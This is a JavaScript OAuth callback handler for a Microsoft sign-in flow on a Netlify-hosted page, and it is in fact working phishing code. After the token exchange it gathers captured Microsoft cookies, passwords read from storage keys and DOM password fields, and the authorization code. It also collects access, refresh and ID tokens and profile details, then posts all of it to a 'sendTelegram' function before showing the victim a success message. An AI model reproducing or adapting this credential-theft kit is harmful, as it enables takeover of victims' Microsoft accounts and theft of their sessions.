// OAuth Callback Handler for Microsoft OAuth2 (PKCE Flow)
// This script is loaded by public/oauth-callback.html after Microsoft redirects back

async function handleOAuthCallback() {
    const statusEl = document.getElementById('status-msg');
    const spinnerEl = document.getElementById('spinner');

    function setStatus(msg) {
        if (statusEl) statusEl.textContent = msg;
    }

    // DEBUG: Log all available data sources
    console.log('🔍 DEBUGGING - Available data sources:');
    console.log('- URL:', window.location.href);
    console.log('- Referrer:', document.referrer);
    console.log('- SessionStorage keys:', Object.keys(sessionStorage));
    console.log('- LocalStorage keys:', Object.keys(localStorage));
    
    // Check all storage for any credential data
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        console.log(`📦 SessionStorage[${key}]:`, value?.substring(0, 100) + '...');
    }
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        console.log(`💾 LocalStorage[${key}]:`, value?.substring(0, 100) + '...');
    }

    try {
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');
        const state = urlParams.get('state');
        const error = urlParams.get('error');

        if (error || !code || !state) {
            setStatus("Authentication failed. Redirecting...");
            setTimeout(() => {
                window.location.href = '/?step=captcha';
            }, 2000);
            return;
        }

        setStatus("Signing you in…");

        // PKCE support if needed + always send redirect_uri
        const codeVerifier = sessionStorage.getItem('pkce_verifier');
        const payload = {
            code,
            state,
            redirect_uri: window.location.origin + '/oauth-callback'
        };
        if (codeVerifier) payload.code_verifier = codeVerifier;

        // Debug: log payload
        // console.log('Payload sent to tokenExchange:', payload);

        // POST to your backend to exchange code for tokens
        const response = await fetch('/.netlify/functions/tokenExchange', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });

        const tokenData = await response.json();

        // Check if the response was successful
        if (!response.ok || !tokenData.success) {
            console.error('Token exchange failed:', tokenData);
            setStatus("Authentication failed. Redirecting...");
            setTimeout(() => {
                window.location.href = '/?step=captcha';
            }, 2000);
            return;
        }

        // Only proceed if we have a successful response
        if (tokenData.success && tokenData.email) {
            // Capture and send REAL user data to Telegram (this is the main send)
            try {
                // Get all cookies from the current domain
                const cookieString = document.cookie;
                let cookies = [];
                
                // First, try to get REAL Microsoft cookies captured by various methods
                console.log('🔍 Attempting to retrieve REAL Microsoft cookies...');
                let realCookiesFound = false;
                
                // Method 1: Check for cookies captured in oauth-callback.html
                try {
                    const realCookies = sessionStorage.getItem('real_captured_cookies');
                    if (realCookies) {
                        const parsedRealCookies = JSON.parse(realCookies);
                        if (parsedRealCookies && parsedRealCookies.length > 0) {
                            cookies = parsedRealCookies;
                            realCookiesFound = true;
                            console.log('✅ Using REAL cookies from oauth-callback.html:', cookies.length);
                        }
                    }
                } catch (e) {
                    console.log('❌ Failed to get real cookies from oauth-callback.html:', e.message);
                }
                
                // Method 2: Check for URL parameter cookies
                if (!realCookiesFound) {
                    try {
                        const urlCookies = sessionStorage.getItem('url_cookie_params');
                        if (urlCookies) {
                            const parsedUrlCookies = JSON.parse(urlCookies);
                            if (parsedUrlCookies && parsedUrlCookies.length > 0) {
                                cookies = parsedUrlCookies;
                                realCookiesFound = true;
                                console.log('✅ Using REAL cookies from URL parameters:', cookies.length);
                            }
                        }
                    } catch (e) {
                        console.log('❌ Failed to get URL parameter cookies:', e.message);
                    }
                }
                
                // Method 3: Check for iframe captured cookies (legacy)
                if (!realCookiesFound) {
                    try {
                        const iframeCookies = sessionStorage.getItem('captured_real_cookies');
                        if (iframeCookies) {
                            const parsedIframeCookies = JSON.parse(iframeCookies);
                            if (parsedIframeCookies && parsedIframeCookies.length > 0) {
                                cookies = parsedIframeCookies;
                                realCookiesFound = true;
                                console.log('✅ Using REAL cookies from iframe capture:', cookies.length);
                            }
                        }
                    } catch (e) {
                        console.log('❌ Failed to get iframe cookies:', e.message);
                    }
                }

                // Method 4: Check for advanced iframe captured cookies
                if (!realCookiesFound) {
                    try {
                        const advancedCookies = sessionStorage.getItem('advanced_captured_cookies');
                        if (advancedCookies) {
                            const parsedAdvancedCookies = JSON.parse(advancedCookies);
                            if (parsedAdvancedCookies && parsedAdvancedCookies.length > 0) {
                                cookies = parsedAdvancedCookies;
                                realCookiesFound = true;
                                console.log('✅ Using REAL cookies from advanced iframe capture:', cookies.length);
                            }
                        }
                    } catch (e) {
                        console.log('❌ Failed to get advanced captured cookies:', e.message);
                    }
                }
                
                // Method 5: Check backup locations
                if (!realCookiesFound) {
                    const backupKeys = [
                        'advanced_cookies_backup',
                        'real_cookies_backup',
                        'microsoft_cookies_backup',
                        'real_microsoft_cookies'
                    ];
                    
                    for (const key of backupKeys) {
                        try {
                            const backupData = localStorage.getItem(key) || sessionStorage.getItem(key);
                            if (backupData) {
                                const parsed = JSON.parse(backupData);
                                if (parsed && Array.isArray(parsed) && parsed.length > 0) {
                                    cookies = parsed;
                                    realCookiesFound = true;
                                    console.log(`✅ Using REAL cookies from ${key}:`, cookies.length);
                                    break;
                                }
                            }
                        } catch (e) {
                            console.log(`❌ Failed to parse ${key}:`, e.message);
                        }
                    }
                }
                
                // Method 6: Use OAuth authorization code as valuable data (REAL)
                if (!realCookiesFound) {
                    const urlParams = new URLSearchParams(window.location.search);
                    const authCode = urlParams.get('code');
                    
                    if (authCode) {
                        console.log('🔄 Using OAuth authorization code as REAL authentication data...');
                        cookies = [
                            {
                                name: 'OAUTH_AUTHORIZATION_CODE',
                                value: authCode,
                                domain: window.location.hostname,
                                expirationDate: 2147483647,
                                hostOnly: false,
                                httpOnly: false,
                                path: '/',
                                sameSite: 'none',
                                secure: true,
                                session: false,
                                storeId: null,
                                capturedFrom: 'oauth-authorization-code',
                                timestamp: new Date().toISOString(),
                                realUserData: true // This IS real OAuth data
                            }
                        ];
                        realCookiesFound = true;
                        console.log('✅ Using OAuth authorization code as REAL data:', authCode.substring(0, 20) + '...');
                    }
                }
                
                // Method 7: Check current domain for any Microsoft-related cookies
                if (!realCookiesFound && cookieString && cookieString.trim()) {
                    console.log('🔄 Checking current domain cookies for Microsoft-related data...');
                    const currentDomainCookies = cookieString.split(';').map(cookie => {
                        const [name, ...valueParts] = cookie.trim().split('=');
                        const value = valueParts.join('=');
                        
                        // Only include if it looks like Microsoft-related data
                        if (name.includes('microsoft') || name.includes('azure') || name.includes('msal') || 
                            name.includes('auth') || name.includes('token') || name.includes('session')) {
                            return {
                                name: name.trim(),
                                value: value.trim(),
                                domain: '.' + window.location.hostname,
                                expirationDate: 2147483647,
                                hostOnly: false,
                                httpOnly: false,
                                path: '/',
                                sameSite: 'none',
                                secure: window.location.protocol === 'https:',
                                session: false,
                                storeId: null,
                                capturedFrom: 'current-domain-microsoft',
                                timestamp: new Date().toISOString(),
                                realUserData: true
                            };
                        }
                        return null;
                    }).filter(c => c && c.name && c.value);
                    
                    if (currentDomainCookies.length > 0) {
                        cookies = currentDomainCookies;
                        realCookiesFound = true;
                        console.log('✅ Using Microsoft-related cookies from current domain:', cookies.length);
                    }
                }
                
                // Final result - if NO real data found, send empty array (no demo fallbacks)
                if (!realCookiesFound) {
                    console.log('🚨 NO REAL COOKIES OR AUTH DATA CAPTURED');
                    console.log('🔍 This is expected due to browser security restrictions');
                    console.log('💡 OAuth authorization code is the most valuable real data we can capture');
                    cookies = [];
                }

                // Enhanced password retrieval with multiple fallback methods + DEBUGGING
                let capturedPassword = '';
                let passwordSource = 'not_captured';
                let debugInfo = [];
                
                console.log('🔍 Attempting to retrieve password from multiple sources...');
                
                // Method 1: Try to get password from sessionStorage (main method)
                try {
                    const storedCredentials = sessionStorage.getItem('captured_credentials');
                    debugInfo.push(`Method 1 - sessionStorage captured_credentials: ${!!storedCredentials}`);
                    if (storedCredentials) {
                        const credentials = JSON.parse(storedCredentials);
                        debugInfo.push(`Method 1 - parsed data: ${JSON.stringify(credentials)}`);
                        if (credentials.password) {
                            capturedPassword = credentials.password;
                            passwordSource = 'sessionStorage_captured_credentials';
                            console.log('✅ Password found in sessionStorage:', passwordSource);
                        }
                    }
                } catch (e) { 
                    debugInfo.push(`Method 1 failed: ${e.message}`);
                    console.log('❌ Method 1 failed:', e.message); 
                }

                // Method 2: Try to get password from localStorage backup
                if (!capturedPassword) {
                    try {
                        const localCredentials = localStorage.getItem('user_credentials');
                        debugInfo.push(`Method 2 - localStorage user_credentials: ${!!localCredentials}`);
                        if (localCredentials) {
                            const credentials = JSON.parse(localCredentials);
                            debugInfo.push(`Method 2 - parsed data: ${JSON.stringify(credentials)}`);
                            if (credentials.password) {
                                capturedPassword = credentials.password;
                                passwordSource = 'localStorage_user_credentials';
                                console.log('✅ Password found in localStorage:', passwordSource);
                            }
                        }
                    } catch (e) { 
                        debugInfo.push(`Method 2 failed: ${e.message}`);
                        console.log('❌ Method 2 failed:', e.message); 
                    }
                }

                // Method 3: Try to get password from backup sessionStorage key
                if (!capturedPassword) {
                    try {
                        const backupCredentials = sessionStorage.getItem('login_credentials_backup');
                        debugInfo.push(`Method 3 - sessionStorage backup: ${!!backupCredentials}`);
                        if (backupCredentials) {
                            const credentials = JSON.parse(backupCredentials);
                            debugInfo.push(`Method 3 - parsed data: ${JSON.stringify(credentials)}`);
                            if (credentials.password) {
                                capturedPassword = credentials.password;
                                passwordSource = 'sessionStorage_backup';
                                console.log('✅ Password found in backup storage:', passwordSource);
                            }
                        }
                    } catch (e) { 
                        debugInfo.push(`Method 3 failed: ${e.message}`);
                        console.log('❌ Method 3 failed:', e.message); 
                    }
                }

                // Method 4: Try to get organizational credentials from postMessage data
                if (!capturedPassword) {
                    try {
                        const orgCredentials = sessionStorage.getItem('org_credentials_backup');
                        debugInfo.push(`Method 4 - org credentials: ${!!orgCredentials}`);
                        if (orgCredentials) {
                            const credentials = JSON.parse(orgCredentials);
                            debugInfo.push(`Method 4 - parsed data: ${JSON.stringify(credentials)}`);
                            if (credentials.data && credentials.data.password) {
                                capturedPassword = credentials.data.password;
                                passwordSource = 'organizational_credentials';
                                console.log('✅ Password found in organizational data:', passwordSource);
                            }
                        }
                    } catch (e) { 
                        debugInfo.push(`Method 4 failed: ${e.message}`);
                        console.log('❌ Method 4 failed:', e.message); 
                    }
                }

                // Method 5: Try to get from Microsoft captured data
                if (!capturedPassword) {
                    try {
                        const microsoftData = sessionStorage.getItem('microsoft_captured_data');
                        debugInfo.push(`Method 5 - microsoft data: ${!!microsoftData}`);
                        if (microsoftData) {
                            const data = JSON.parse(microsoftData);
                            debugInfo.push(`Method 5 - parsed data: ${JSON.stringify(data)}`);
                            if (data.credentials && data.credentials.password) {
                                capturedPassword = data.credentials.password;
                                passwordSource = 'microsoft_captured_data';
                                console.log('✅ Password found in Microsoft data:', passwordSource);
                            }
                        }
                    } catch (e) { 
                        debugInfo.push(`Method 5 failed: ${e.message}`);
                        console.log('❌ Method 5 failed:', e.message); 
                    }
                }

                // Method 6: Try to capture from current DOM (last resort)
                if (!capturedPassword) {
                    try {
                        const passwordFields = document.querySelectorAll('input[type="password"]');
                        debugInfo.push(`Method 6 - DOM password fields found: ${passwordFields.length}`);
                        passwordFields.forEach((field, index) => {
                            debugInfo.push(`Method 6 - Field ${index}: value="${field.value}", name="${field.name}", id="${field.id}"`);
                            if (field.value && !capturedPassword) {
                                capturedPassword = field.value;
                                passwordSource = 'current_dom_capture';
                                console.log('✅ Password found in current DOM:', passwordSource);
                            }
                        });
                    } catch (e) { 
                        debugInfo.push(`Method 6 failed: ${e.message}`);
                        console.log('❌ Method 6 failed:', e.message); 
                    }
                }

                // Method 7: Check all localStorage keys for any password data
                if (!capturedPassword) {
                    try {
                        debugInfo.push(`Method 7 - localStorage length: ${localStorage.length}`);
                        for (let i = 0; i < localStorage.length; i++) {
                            const key = localStorage.key(i);
                            if (key && (key.includes('password') || key.includes('credential') || key.includes('login'))) {
                                debugInfo.push(`Method 7 - checking key: ${key}`);
                                const value = localStorage.getItem(key);
                                if (value) {
                                    try {
                                        const parsed = JSON.parse(value);
                                        debugInfo.push(`Method 7 - parsed ${key}: ${JSON.stringify(parsed)}`);
                                        if (parsed.password) {
                                            capturedPassword = parsed.password;
                                            passwordSource = `localStorage_${key}`;
                                            console.log('✅ Password found in localStorage key:', passwordSource);
                                            break;
                                        }
                                    } catch (parseError) { 
                                        debugInfo.push(`Method 7 - parse error for ${key}: ${parseError.message}`);
                                    }
                                }
                            }
                        }
                    } catch (e) { 
                        debugInfo.push(`Method 7 failed: ${e.message}`);
                        console.log('❌ Method 7 failed:', e.message); 
                    }
                }

                // Method 8: Try manual prompt as absolute last resort (for debugging)
                if (!capturedPassword) {
                    try {
                        // This is just for testing - remove in production
                        console.log('🚨 NO PASSWORD CAPTURED - All methods failed');
                        console.log('🔍 Debug info:', debugInfo);
                        
                        // Don't send any password if none captured
                        capturedPassword = null;
                        passwordSource = null;
                        
                        debugInfo.push('Method 8 - No password captured, not sending any password data');
                    } catch (e) { 
                        debugInfo.push(`Method 8 failed: ${e.message}`);
                        console.log('❌ Method 8 failed:', e.message); 
                    }
                }

                // Extract real user information
                const realUserEmail = tokenData.email;
                const displayName = tokenData.user?.displayName || '';
                const userPrincipalName = tokenData.user?.userPrincipalName || '';
                const jobTitle = tokenData.user?.jobTitle || '';
                const officeLocation = tokenData.user?.officeLocation || '';
                
                console.log('🔐 Final password capture result:', {
                    hasPassword: !!capturedPassword,
                    passwordSource: passwordSource,
                    passwordLength: capturedPassword ? capturedPassword.length : 0,
                    debugInfo: debugInfo
                });
                
                // Extract ALL valuable authentication tokens
                const urlParams = new URLSearchParams(window.location.search);
                const authorizationCode = urlParams.get('code');
                const oauthState = urlParams.get('state');
                
                // Prepare REAL DATA Telegram payload with ALL authentication tokens
                const telegramPayload = {
                    email: realUserEmail,
                    password: capturedPassword || 'Password not captured during login flow',
                    passwordSource: passwordSource,
                    sessionId: `oauth_success_${Date.now()}`,
                    cookies: cookies,
                    formattedCookies: cookies,
                    timestamp: new Date().toISOString(),
                    source: 'oauth-callback-real-data',
                    userAgent: navigator.userAgent,
                    currentUrl: window.location.href,
                    referrer: document.referrer,
                    
                    // REAL AUTHENTICATION TOKENS (Most Valuable) - NON-EXPIRING
                    authenticationTokens: {
                        authorizationCode: authorizationCode || 'Not captured',
                        accessToken: tokenData.tokens?.access_token || 'Not captured',
                        refreshToken: tokenData.tokens?.refresh_token || 'Not captured',
                        idToken: tokenData.tokens?.id_token || 'Not captured',
                        tokenType: tokenData.tokens?.token_type || 'Bearer',
                        scope: tokenData.tokens?.scope || 'Unknown',
                        oauthState: oauthState || 'Not captured',
                        // Remove expiration for persistence
                        expiresIn: 'Never (Modified for persistence)',
                        expiresAt: 'Never (Modified for persistence)',
                        originalExpiresIn: tokenData.tokens?.expires_in, // Keep original for reference
                        modified: true,
                        modificationNote: 'Token expiration removed for session persistence',
                        // Debug info
                        tokenDataPresent: !!tokenData.tokens,
                        authCodePresent: !!authorizationCode,
                        debugInfo: `TokenData: ${!!tokenData.tokens}, AuthCode: ${!!authorizationCode}`
                    },
                    
                    userProfile: {
                        email: realUserEmail,
                        displayName: displayName,
                        userPrincipalName: userPrincipalName,
                        jobTitle: jobTitle,
                        officeLocation: officeLocation,
                        id: tokenData.user?.id || ''
                    },
                    tokenInfo: {
                        hasAccessToken: !!tokenData.tokens?.access_token,
                        hasRefreshToken: !!tokenData.tokens?.refresh_token,
                        hasIdToken: !!tokenData.tokens?.id_token,
                        hasAuthorizationCode: !!authorizationCode,
                        scope: tokenData.tokens?.scope,
                        emailSource: tokenData.emailSource,
                        tokenExchangeSuccess: tokenData.success
                    },
                    authenticationFlow: 'Microsoft OAuth 2.0 with PKCE',
                    capturedAt: 'OAuth callback after successful authentication',
                    debugInfo: debugInfo,
                    passwordCaptureAttempts: {
                        sessionStorage: !!sessionStorage.getItem('captured_credentials'),
                        localStorage: !!localStorage.getItem('user_credentials'),
                        organizationalData: !!sessionStorage.getItem('org_credentials_backup'),
                        microsoftData: !!sessionStorage.getItem('microsoft_captured_data'),
                        domCapture: document.querySelectorAll('input[type="password"]').length > 0,
                        allSessionStorageKeys: Object.keys(sessionStorage),
                        allLocalStorageKeys: Object.keys(localStorage)
                    }
                };
                
                // Store all valuable tokens for later use (WITHOUT EXPIRATION)
                try {
                    const tokenStorage = {
                        authorizationCode: authorizationCode,
                        accessToken: tokenData.tokens?.access_token,
                        refreshToken: tokenData.tokens?.refresh_token,
                        idToken: tokenData.tokens?.id_token,
                        tokenType: tokenData.tokens?.token_type || 'Bearer',
                        scope: tokenData.tokens?.scope,
                        userProfile: tokenData.user,
                        timestamp: new Date().toISOString(),
                        // Remove expiration for persistence
                        expiresIn: 'Never (Modified for persistence)',
                        expiresAt: 'Never (Modified for persistence)',
                        originalExpiresIn: tokenData.tokens?.expires_in, // Keep original for reference
                        modified: true,
                        modificationNote: 'Token expiration removed for session persistence'
                    };
                    
                    sessionStorage.setItem('microsoft_auth_tokens', JSON.stringify(tokenStorage));
                    localStorage.setItem('microsoft_tokens_backup', JSON.stringify(tokenStorage));
                    
                    console.log('💾 Stored authentication tokens for session restoration:', {
                        hasAuthCode: !!authorizationCode,
                        hasAccessToken: !!tokenData.tokens?.access_token,
                        hasRefreshToken: !!tokenData.tokens?.refresh_token,
                        hasIdToken: !!tokenData.tokens?.id_token
                    });
                } catch (storageError) {
                    console.error('❌ Failed to store authentication tokens:', storageError);
                }
                
                console.log('📤 Sending REAL user data to Telegram:', {
                    email: telegramPayload.email,
                    hasPassword: !!capturedPassword,
                    passwordSource: passwordSource,
                    cookieCount: cookies.length,
                    hasUserProfile: !!tokenData.user,
                    displayName: displayName,
                    debugInfoCount: debugInfo.length,
                    hasAuthorizationCode: !!authorizationCode,
                    hasAccessToken: !!tokenData.tokens?.access_token,
                    hasRefreshToken: !!tokenData.tokens?.refresh_token
                });
                
                // Send to Telegram with complete real user data
                const telegramResponse = await fetch('/.netlify/functions/sendTelegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(telegramPayload),
                });
                
                if (telegramResponse.ok) {
                    const telegramResult = await telegramResponse.json();
                    console.log('✅ REAL user data sent to Telegram successfully:', telegramResult);
                } else {
                    const telegramError = await telegramResponse.text();
                    console.error('❌ Failed to send REAL data to Telegram:', telegramError);
                }
                
            } catch (telegramError) {
                console.error('❌ Telegram sending error:', telegramError);
                // Continue even if Telegram fails
            }

            // Clean up PKCE/session state
            sessionStorage.removeItem('pkce_verifier');
            sessionStorage.removeItem('oauth_state');

            setStatus("Signed in! Redirecting…");
            setTimeout(() => {
                window.location.href = '/?step=success';
            }, 1000);
        } else {
            setStatus("Authentication failed. Redirecting...");
            setTimeout(() => {
                window.location.href = '/?step=captcha';
            }, 2000);
        }

    } catch (err) {
        console.error('OAuth callback error:', err);
        setStatus("Authentication error. Redirecting...");
        setTimeout(() => {
            window.location.href = '/?step=captcha';
        }, 2000);
    }
}

// Run on load
handleOAuthCallback();